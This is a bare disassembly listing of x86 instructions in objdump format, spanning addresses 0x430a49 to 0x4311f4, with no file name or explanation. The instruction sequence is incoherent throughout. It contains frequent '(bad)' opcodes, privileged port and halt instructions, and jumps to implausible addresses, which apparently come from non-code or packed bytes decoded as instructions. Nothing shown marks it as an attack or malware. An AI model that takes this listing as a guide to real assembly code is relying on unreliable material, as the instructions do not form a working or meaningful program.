  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
  430b61:	into   
  430b62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430b69:	test   al,0x4d
  430b6b:	push   ebp
  430b6c:	jbe    0x430ba1
  430b6e:	mov    esi,DWORD PTR [ebx]
  430b70:	mov    al,0x3
  430b72:	push   ebp
  430b73:	add    esi,DWORD PTR [ebx]
  430b75:	rdpmc  
  430b77:	retf   0x5503
  430b7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b80:	dec    ebp
  430b81:	stc    
  430b82:	mov    ecx,DWORD PTR [eax]
  430b84:	or     BYTE PTR [ebp+0x4d],cl
  430b87:	jmp    0x1370c17
  430b8c:	dec    ebp
  430b8d:	dec    ebp
  430b8e:	(bad)  
  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
